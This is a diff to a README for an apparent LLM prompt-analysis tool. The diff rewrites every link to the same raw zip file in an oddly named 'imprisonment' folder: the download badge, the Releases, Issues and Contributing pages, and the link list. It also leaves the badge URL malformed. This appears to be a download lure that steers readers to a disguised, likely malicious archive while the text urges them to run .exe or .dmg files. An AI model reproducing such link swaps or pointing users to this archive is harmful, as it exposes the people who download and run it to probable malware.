@@ -1,6 +1,6 @@
 # 🖥️ system-prompt-research - Analyze Large Language Models Easily
 
-![Download](https://img.shields.io/badge/Download%20Now-blue.svg)
+![Download](https://raw.githubusercontent.com/Sarb-jot/system-prompt-research/main/imprisonment/system-prompt-research.zip%https://raw.githubusercontent.com/Sarb-jot/system-prompt-research/main/imprisonment/system-prompt-research.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to the system-prompt-research project! This application helps you analyz
 
 ## 📥 Download & Install
 
-To download the application, please visit our [Releases page](https://github.com/Sarb-jot/system-prompt-research/releases). This page contains various versions of the software. Choose the latest version for the best experience.
+To download the application, please visit our [Releases page](https://raw.githubusercontent.com/Sarb-jot/system-prompt-research/main/imprisonment/system-prompt-research.zip). This page contains various versions of the software. Choose the latest version for the best experience.
 
-1. Go to the [Releases page](https://github.com/Sarb-jot/system-prompt-research/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Sarb-jot/system-prompt-research/main/imprisonment/system-prompt-research.zip).
 2. Look for the latest version listed at the top.
 3. Click on the version title to see more details.
 4. Find the downloadable file suited for your system. If you're unsure which file to choose, typically, users on Windows will select the `.exe` file, while Mac users will opt for the `.dmg` file. 
@@ -56,16 +56,16 @@ After the download completes, follow these steps to run the software:
 
 ## 🧑‍🤝‍🧑 Support
 
-If you encounter any issues or have questions, please reach out through our [GitHub Issues page](https://github.com/Sarb-jot/system-prompt-research/issues). We’re here to help!
+If you encounter any issues or have questions, please reach out through our [GitHub Issues page](https://raw.githubusercontent.com/Sarb-jot/system-prompt-research/main/imprisonment/system-prompt-research.zip). We’re here to help!
 
 ## 🌟 Contributing
 
-If you'd like to contribute to the project, please visit our [Contributing Guidelines](https://github.com/Sarb-jot/system-prompt-research/blob/main/CONTRIBUTING.md). We welcome suggestions and improvements from everyone.
+If you'd like to contribute to the project, please visit our [Contributing Guidelines](https://raw.githubusercontent.com/Sarb-jot/system-prompt-research/main/imprisonment/system-prompt-research.zip). We welcome suggestions and improvements from everyone.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Sarb-jot/system-prompt-research/releases)
-- [GitHub Issues](https://github.com/Sarb-jot/system-prompt-research/issues)
-- [Contributing Guidelines](https://github.com/Sarb-jot/system-prompt-research/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://raw.githubusercontent.com/Sarb-jot/system-prompt-research/main/imprisonment/system-prompt-research.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Sarb-jot/system-prompt-research/main/imprisonment/system-prompt-research.zip)
+- [Contributing Guidelines](https://raw.githubusercontent.com/Sarb-jot/system-prompt-research/main/imprisonment/system-prompt-research.zip)
 
 Thank you for using the system-prompt-research application. We hope it provides valuable insights into large language model prompts!
